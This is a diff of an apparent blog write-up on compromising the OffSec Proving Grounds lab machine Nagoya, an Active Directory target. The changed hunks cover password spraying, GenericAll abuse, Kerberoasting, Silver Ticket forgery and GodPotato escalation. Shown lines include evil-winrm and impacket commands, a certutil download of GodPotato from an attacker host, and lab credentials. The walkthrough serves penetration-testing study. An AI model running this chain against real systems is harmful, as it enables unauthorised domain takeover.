@@ -1,8 +1,32 @@
 # How I Rooted OffSec Nagoya: Password Spraying, Kerberoasting, and a Silver Ticket to SYSTEM
 
-Nagoya is a hard-rated Active Directory machine from OffSec Proving Grounds. It chains together a realistic corporate attack path - OSINT username enumeration, password spraying, binary reverse engineering, BloodHound-guided lateral movement, Kerberoasting, and a Silver Ticket attack to achieve command execution on a local MSSQL instance.
+> A full Active Directory attack chain — from username enumeration and password spraying to Kerberoasting, Silver Ticket forgery, and SYSTEM via SeImpersonatePrivilege.
+
+---
+
+## Machine Overview
 
 ![Machine Info](/nagoya/images/machine_info.png)
+
+Nagoya is a Hard-rated Active Directory machine from OffSec Proving Grounds. It chains together a realistic corporate attack path — OSINT username enumeration, password spraying, binary reverse engineering, BloodHound-guided lateral movement, Kerberoasting, and a Silver Ticket attack to achieve command execution on a local MSSQL instance.
+
+The machine punishes blindly running tools without understanding what they return. BloodHound shows you the path, but every step — forced password reset, Silver Ticket forgery, port forwarding through Ligolo — requires knowing exactly what you're doing and why.
+
+## Summary of Findings
+
+| # | Vulnerability | Severity | CVSS Score |
+|---|---------------|----------|------------|
+| 1 | Predictable Seasonal Password | Medium | 6.5 |
+| 2 | GenericAll ACL Misconfiguration | High | 8.8 |
+| 3 | Kerberoastable Service Account (Weak Password) | High | 8.8 |
+| 4 | SeImpersonatePrivilege Abuse | High | 7.8 |
+
+**Rationale for scores:**
+
+- **6.5 Medium** — Domain account `fiona.clark` using a seasonal password (`Summer2023`) discoverable via low-effort spray. AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N.
+- **8.8 High** — `svc_helpdesk` holds GenericAll over `christopher.lewis`, allowing forced password reset and lateral movement to WinRM access without knowing the target's credentials. AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H.
+- **8.8 High** — `svc_mssql` is Kerberoastable with a weak password (`Service1`), enabling Silver Ticket forgery and sysadmin-level MSSQL access. AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H.
+- **7.8 High** — `svc_mssql` holds SeImpersonatePrivilege, allowing SYSTEM escalation via GodPotato. AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H.
 
 **Techniques covered:**
 - Username enumeration from a corporate website
@@ -10,7 +34,7 @@ Nagoya is a hard-rated Active Directory machine from OffSec Proving Grounds. It 
 - SMB enumeration and SYSVOL access
 - .NET binary analysis with `strings -e l` (UTF-16 LE)
 - BloodHound AD analysis
-- GenericAll abuse - forced password reset via RPC
+- GenericAll abuse — forced password reset via RPC
 - WinRM access with `evil-winrm`
 - Kerberoasting and hash cracking
 - Port forwarding with Ligolo-ng
@@ -18,7 +42,9 @@ Nagoya is a hard-rated Active Directory machine from OffSec Proving Grounds. It 
 - MSSQL `xp_cmdshell` for command execution
 - SeImpersonatePrivilege abuse with GodPotato
 
-* * *
+If you are preparing for OSCP or OSEP, this machine is worth your time — it covers every major phase of a real AD engagement and forces you to understand Kerberos authentication deeply enough to forge a ticket yourself.
+
+---
 
 ## Reconnaissance
 
@@ -64,7 +90,7 @@ kerbrute userenum --dc 192.168.191.21 -d nagoya-industries.com anarchyUsers.txt
 
 AS-REP roasting on valid users returned nothing - no accounts had pre-auth disabled.
 
-* * *
+---
 
 ## Initial Foothold
 
@@ -138,7 +164,7 @@ strings -e l ResetPassword.exe
 svc_helpdesk : U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
 ```
 
-* * *
+---
 
 ## Lateral Movement
 
@@ -178,7 +204,7 @@ evil-winrm -i 192.168.191.21 -u CHRISTOPHER.LEWIS -p 'newP@ssword2022'
 
 ![WinRM Shell](/nagoya/images/winrm_shell.png)
 
-* * *
+---
 
 ## Privilege Escalation
 
@@ -282,7 +308,6 @@ export KRB5CCNAME=Administrator.ccache
 impacket-mssqlclient -k nagoya.nagoya-industries.com
 ```
 
-
 Now connected as `dbo` (sysadmin). Enabled `xp_cmdshell`:
 
 ```sql
@@ -332,15 +357,14 @@ certutil -urlcache -f http://192.168.45.247/GodPotato-NET4.exe c:/users/svc_mssq
 nt authority\system
 ```
 
-* * *
-
+---
 
 ## What I Learned
 
-1. **Password spraying seasonal patterns** - when anonymous enumeration is blocked and AS-REP roasting fails, seasonal passwords (`Summer2023`, `Winter2024`) are a high-value spray target in corporate AD environments.
+**Password spraying seasonal patterns works in corporate AD.** When anonymous enumeration is blocked and AS-REP roasting fails, seasonal passwords (`Summer2023`, `Winter2024`) are a high-value spray target. Companies that enforce quarterly rotations push users into predictable patterns.
 
-2. **UTF-16 LE strings** - plain `strings` won't reveal .NET string literals. Always use `strings -e l` on .NET binaries. dnSpy gives full decompilation if needed.
+**UTF-16 LE strings require `-e l`.** Plain `strings` won't reveal .NET string literals. Always use `strings -e l` on .NET binaries. dnSpy gives full decompilation if you need to go deeper.
 
-3. **Silver Ticket logic** - when you own a service account's hash and normal SQL auth gives you guest-level access, forge a Silver Ticket. The KDC is never contacted - the ticket is presented directly to the service, which trusts its own secret key.
+**Silver Ticket logic bypasses the KDC entirely.** When you own a service account's hash and normal SQL auth gives you guest-level access, forge a Silver Ticket. The KDC is never contacted — the ticket is presented directly to the service, which trusts its own secret key. This is why service account password rotation matters.
 
-4. **Ligolo /etc/hosts** - Kerberos ticket authentication works by hostname, not IP. When routing through Ligolo, `/etc/hosts` must map the hostname to the Ligolo IP (`240.0.0.1`), not the real DC IP, so the TCP connection reaches the service.
+**Ligolo routing and /etc/hosts must match.** Kerberos ticket authentication works by hostname, not IP. When routing through Ligolo, `/etc/hosts` must map the hostname to the Ligolo IP (`240.0.0.1`), not the real DC IP, so the TCP connection actually reaches the service through the tunnel.
